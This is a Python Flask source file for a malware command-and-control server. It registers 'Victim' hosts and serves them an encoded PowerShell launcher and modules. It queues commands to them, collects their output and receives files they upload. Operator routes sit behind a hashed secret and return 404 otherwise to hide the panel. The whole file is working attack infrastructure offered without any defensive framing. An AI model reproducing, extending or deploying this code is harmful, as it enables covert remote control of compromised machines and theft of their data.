from app import app, db
from flask import request, abort
from models import Victim, Cmd
from json import dumps
from hashlib import sha256
from functools import wraps
from base64 import b64encode as enc, b64decode as dec
from jinja2 import Template
from conf import variables
import os



def is_secret(f):
    @wraps(f)
    def wrap(*args, **kwargs):
        if request.headers.get('content-type') != 'application/json' or \
        "secret" not in request.json or sha256(request.json["secret"].encode()).hexdigest()!='2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b':
            return abort(404)
        return f(*args, **kwargs)
        
    return wrap

def render_template(template_content, variables):
    template = Template(template_content)
    return template.render(**variables)

def manage(cmd, request):
    module = "{0}.ps1".format(cmd)
    if module in os.listdir("modules"): 
        cmd = render_template(open(os.path.join("modules", module),"r").read(),variables | {"encoded_payload":encoded_payload()}) 
        
    return enc(cmd.encode()).decode()

def encoded_payload():
    with open("client/client.ps1", 'r') as script_file:
        return enc(Template(script_file.read()).render(variables).encode('utf-16-le')).decode()
    

# Quick Copy Payload

@app.route("/p", methods=["GET"])
def p():
    return f'{variables["start_powershell"]} {encoded_payload()}'



# Client routes

@app.route("/run", methods=["POST"])
def run():
    v=Victim.query.filter_by(hostname=request.json["hostname"]).first()
    if v is None:
        v = Victim(hostname=request.json["hostname"])
        db.session.add(v)
        db.session.commit()

    
    return {"currentcmd": manage(v.getInfo()["currentcmd"], request), "delta":v.getInfo()["delta"]}

@app.route("/out",methods=["POST"])
def out():
    v=Victim.query.filter_by(hostname= request.json["hostname"]).first()
    cmd = Cmd(
        str=v.getInfo()["currentcmd"],
        output= request.json["out"],
        victimid=v.getInfo()["id"]
    )
    v.currentcmd="hold"
    db.session.add(cmd)
    db.session.commit()
    return  {}

@app.route("/file", methods=["POST"])
def upload():
    
    filename = request.json["filename"].split("\\")[-1]
    dir = os.path.join("files", request.json["hostname"].strip())
    if not os.path.exists(dir):
        os.mkdir(dir)
    open(os.path.join(dir, filename), "wb").write(dec(request.json["file"]))
    return {}


# Attacker routes
@app.route("/list", methods=["GET"])
@is_secret
def list():
    return dumps([v.getInfo() for v in Victim.query.all()]) or {}

@app.route("/listcmd",methods=["GET"])
@is_secret
def listcmd():
    if "id" in request.json:
        id = request.json["id"]
    elif "hostname" in request.json:
        v = Victim.query.filter_by(hostname= request.json["hostname"]).first()
        id = v.getInfo()["id"]
    else:
        return {"error": "Please specify victim id/hostname"}
    return dumps([c.get() for c in Cmd.query.filter_by(victimid=id)])
    

@app.route("/set", methods=["GET"])
@is_secret
def setCmd():
    if "id" in request.json:
        v = Victim.query.filter_by(id = request.json["id"]).first()
    elif "hostname" in request.json:
        v = Victim.query.filter_by(hostname= request.json["hostname"]).first()
    else:
        return {"error": "Please specify victim id/hostname"}
    if not ("cmd" in request.json or "delta" in request.json):
        return {"error": "Please set delta or cmd"}
    if "cmd" in request.json:        
        v.currentcmd = request.json["cmd"]
    if "delta" in request.json:
        v.delta = int(request.json["delta"])
    db.session.commit()
    return {"message":"cmd updated"}


